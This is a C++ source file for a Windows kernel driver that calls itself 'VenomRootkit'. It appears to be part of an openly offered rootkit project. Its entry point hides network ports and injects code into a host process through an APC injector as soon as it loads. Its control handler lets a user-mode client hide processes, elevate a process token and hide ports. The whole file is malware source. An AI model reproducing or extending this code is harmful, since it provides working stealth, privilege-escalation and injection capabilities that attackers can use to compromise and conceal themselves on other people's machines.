#include "Config.h"
#include "Capabilities/InjectionCapabilities/APCInjector.h"
#include "Capabilities/NetworkCapabilites/PortHider.h"
#include "IoctlHandlers.h"
#include "Ioctl.h"
#include "Venom.h"

EXTERN_C NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
	UNREFERENCED_PARAMETER(registryPath);

	auto status = STATUS_SUCCESS;
	PDEVICE_OBJECT deviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");

	bool symLinkCreated = false;
	do
	{
		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
		status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
		if (!NT_SUCCESS(status)) {
			break;
		}

		status = IoCreateSymbolicLink(&symLink, &deviceName);
		if (!NT_SUCCESS(status)) {
			break;
		}
		symLinkCreated = true;

	} while (false);

	if (!NT_SUCCESS(status)) {
		if (symLinkCreated) {
			IoDeleteSymbolicLink(&symLink);
		}
		if (deviceObject) {
			IoDeleteDevice(deviceObject);
		}

		return status;
	}

	deviceObject->Flags |= DO_BUFFERED_IO;

	driverObject->DriverUnload = VenomUnload;
	driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;

	status = PortHider::hide();
	if (!NT_SUCCESS(status)) {
		return status;
	}

	auto process = Process(VENOM_HOST_PROCESS);
	auto apcInjector = APCInjector(process);

	status = apcInjector.inject();

	if (!NT_SUCCESS(status)) {
		return status;
	}

	return STATUS_SUCCESS;
}

NTSTATUS VenomCreateClose(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);

	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS VenomDeviceControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);

	auto stack = IoGetCurrentIrpStackLocation(irp);
	NTSTATUS status = STATUS_SUCCESS;

	switch (static_cast<VenomIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {

	case VenomIoctls::HideProcces:
		status = IoctlHandlers::hideProcess(irp);
		break;
	case VenomIoctls::Elevate:
		status = IoctlHandlers::elevateToken(irp);
		break;
	case VenomIoctls::HidePort:
		status = IoctlHandlers::hidePort(irp);
		break;
	default:
		irp->IoStatus.Information = 0;
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

void VenomUnload(PDRIVER_OBJECT driverObject)
{
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");

	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(driverObject->DeviceObject);

	PortHider::unhide();
}
